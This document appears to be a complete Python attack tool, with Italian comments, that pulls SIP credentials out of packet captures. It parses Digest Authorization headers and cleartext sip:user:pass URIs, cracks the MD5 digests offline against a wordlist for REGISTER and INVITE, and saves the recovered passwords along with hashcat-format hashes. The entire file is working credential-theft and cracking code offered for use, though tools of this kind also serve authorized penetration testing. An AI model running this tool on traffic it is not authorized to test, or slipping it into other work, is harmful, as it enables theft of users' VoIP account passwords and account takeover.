#!/usr/bin/env python3
"""
sip_pcap_creds.py — SIP Credential Extractor from PCAP
Uso: python3 sip_pcap_creds.py <pcap_file> [--output creds.txt]
Richiede: scapy
"""

import argparse
import re
import sys
import hashlib
import os

def check_scapy():
    try:
        from scapy.all import rdpcap, Raw, UDP, TCP
        return True
    except ImportError:
        return False

def parse_sip_message(payload_str):
    """Parsa un messaggio SIP e ritorna headers come dict"""
    lines = payload_str.replace('\r\n', '\n').split('\n')
    headers = {}
    first_line = lines[0] if lines else ""
    for line in lines[1:]:
        if ':' in line:
            key, _, val = line.partition(':')
            key = key.strip().lower()
            val = val.strip()
            headers.setdefault(key, []).append(val)
    return first_line, headers

def extract_digest_params(auth_header):
    """Estrae parametri Digest da header Authorization/Proxy-Authorization"""
    params = {}
    # Verifica che sia Digest
    if not re.match(r'\s*[Dd]igest', auth_header):
        return None
    # Estrai parametri chiave=valore (con o senza virgolette)
    for m in re.finditer(r'(\w+)\s*=\s*"?([^",\r\n]+)"?', auth_header):
        key = m.group(1).lower()
        val = m.group(2).strip('"')
        params[key] = val
    return params

def crack_digest(username, realm, nonce, uri, response_hash, wordlist_file):
    """Tenta crack offline del digest MD5"""
    if not os.path.isfile(wordlist_file):
        return None
    try:
        with open(wordlist_file, 'r', errors='replace') as f:
            for line in f:
                password = line.strip()
                if not password:
                    continue
                # Digest SIP: MD5(MD5(user:realm:pass):nonce:MD5(method:uri))
                # Nota: il metodo viene salvato separatamente se disponibile
                ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
                ha2 = hashlib.md5(f"REGISTER:{uri}".encode()).hexdigest()
                expected = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
                if expected.lower() == response_hash.lower():
                    return password
                # Prova anche con method=INVITE
                ha2_invite = hashlib.md5(f"INVITE:{uri}".encode()).hexdigest()
                expected2 = hashlib.md5(f"{ha1}:{nonce}:{ha2_invite}".encode()).hexdigest()
                if expected2.lower() == response_hash.lower():
                    return password
    except Exception:
        pass
    return None

def extract_cleartext_sip_creds(headers):
    """Cerca credenziali cleartext in From/To/Contact (raro ma possibile)"""
    creds = []
    for hdr_name in ['from', 'to', 'contact']:
        for val in headers.get(hdr_name, []):
            # Cerca sip:user:pass@host
            m = re.search(r'sip:([^:@]+):([^@]+)@', val)
            if m:
                creds.append({"type": "cleartext", "username": m.group(1),
                               "password": m.group(2), "header": hdr_name})
    return creds

def process_pcap(pcap_file, output_file=None, wordlist=None):
    from scapy.all import rdpcap, Raw, UDP, TCP

    print(f"[*] SIP PCAP Credential Extractor — {pcap_file}")

    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print(f"[!] Errore lettura PCAP: {e}")
        sys.exit(1)

    print(f"[*] Pacchetti caricati: {len(packets)}")

    sip_packets = 0
    found_digests = []
    found_cleartext = []
    cracked = []

    for pkt in packets:
        # Filtra UDP/TCP su porte SIP
        if not pkt.haslayer(Raw):
            continue

        is_sip_port = False
        if pkt.haslayer(UDP):
            sport = pkt[UDP].sport
            dport = pkt[UDP].dport
            is_sip_port = sport in (5060, 5061) or dport in (5060, 5061)
        elif pkt.haslayer(TCP):
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
            is_sip_port = sport in (5060, 5061) or dport in (5060, 5061)

        if not is_sip_port:
            continue

        try:
            payload = pkt[Raw].load.decode('utf-8', errors='replace')
        except Exception:
            continue

        # Verifica che sia SIP
        if not (payload.startswith('SIP/') or
                any(m in payload[:20] for m in ['REGISTER', 'INVITE', 'OPTIONS',
                                                  'SUBSCRIBE', 'NOTIFY', 'ACK', 'BYE'])):
            continue

        sip_packets += 1
        first_line, headers = parse_sip_message(payload)

        # Cerca Authorization / Proxy-Authorization
        for auth_hdr in ['authorization', 'proxy-authorization']:
            for auth_val in headers.get(auth_hdr, []):
                params = extract_digest_params(auth_val)
                if params and 'username' in params:
                    digest_info = {
                        "username": params.get('username', ''),
                        "realm": params.get('realm', ''),
                        "nonce": params.get('nonce', ''),
                        "uri": params.get('uri', ''),
                        "response": params.get('response', ''),
                        "algorithm": params.get('algorithm', 'MD5'),
                        "header_type": auth_hdr,
                        "sip_method": first_line.split()[0] if first_line else 'UNKNOWN',
                    }
                    # Evita duplicati
                    if digest_info not in found_digests:
                        found_digests.append(digest_info)
                        user = digest_info['username']
                        realm = digest_info['realm']
                        nonce = digest_info['nonce'][:16] + "..."
                        print(f"[FOUND:HIGH]  Digest trovato: user={user} realm={realm} nonce={nonce}")

        # Cerca credenziali cleartext
        ct = extract_cleartext_sip_creds(headers)
        for c in ct:
            if c not in found_cleartext:
                found_cleartext.append(c)
                print(f"[FOUND:CRITICAL] Cred cleartext: {c['username']}:{c['password']} (header: {c['header']})")

    print(f"\n[*] Pacchetti SIP analizzati: {sip_packets}")
    print(f"[*] Digest trovati: {len(found_digests)}")
    print(f"[*] Credenziali cleartext: {len(found_cleartext)}")

    # Tentativo crack offline
    if wordlist and found_digests:
        print(f"\n[*] Crack offline con wordlist: {wordlist}")
        for d in found_digests:
            if d.get('response') and d.get('nonce'):
                print(f"    Tentativo crack: {d['username']}@{d['realm']}...")
                passwd = crack_digest(
                    d['username'], d['realm'], d['nonce'],
                    d['uri'], d['response'], wordlist
                )
                if passwd:
                    print(f"[FOUND:CRITICAL] CRACKED: {d['username']}:{passwd} @ {d['realm']}")
                    cracked.append({"username": d['username'], "password": passwd, "realm": d['realm']})
                else:
                    print(f"[ ] Non trovata password per: {d['username']}")

    # Output
    if output_file:
        with open(output_file, 'w') as f:
            f.write("# SIP Credentials extracted from PCAP\n")
            f.write(f"# File: {pcap_file}\n\n")
            f.write("# === Cleartext credentials ===\n")
            for c in found_cleartext:
                f.write(f"{c['username']}:{c['password']}\n")
            f.write("\n# === Cracked credentials ===\n")
            for c in cracked:
                f.write(f"{c['username']}:{c['password']} (realm: {c['realm']})\n")
            f.write("\n# === Raw Digest hashes ===\n")
            for d in found_digests:
                f.write(f"Username: {d['username']}\n")
                f.write(f"Realm: {d['realm']}\n")
                f.write(f"Nonce: {d['nonce']}\n")
                f.write(f"URI: {d['uri']}\n")
                f.write(f"Response: {d['response']}\n")
                f.write(f"Algorithm: {d['algorithm']}\n")
                f.write(f"# hashcat format: {d['username']}:*:{d['nonce']}::{d['realm']}:{d['response']}\n\n")
        print(f"\n[*] Output salvato in: {output_file}")

    # Stampa formato hashcat
    if found_digests:
        print(f"\n[*] Hashcat format (mode 11400 — SIP Digest):")
        for d in found_digests:
            print(f"    {d['username']}:*:{d['nonce']}::{d['realm']}:{d['response']}")

    return found_digests, found_cleartext, cracked

def main():
    parser = argparse.ArgumentParser(description="SIP Credential Extractor from PCAP")
    parser.add_argument("pcap_file", help="File PCAP da analizzare")
    parser.add_argument("--output", default=None, help="File output credenziali")
    parser.add_argument("--wordlist", default=None, help="Wordlist per crack offline")
    args = parser.parse_args()

    if not check_scapy():
        print("[!] scapy non installato. Installa con: pip3 install scapy")
        print("[*] Alternativamente: apt install python3-scapy")
        sys.exit(1)

    if not os.path.isfile(args.pcap_file):
        print(f"[!] File PCAP non trovato: {args.pcap_file}")
        sys.exit(1)

    process_pcap(args.pcap_file, args.output, args.wordlist)

if __name__ == "__main__":
    main()
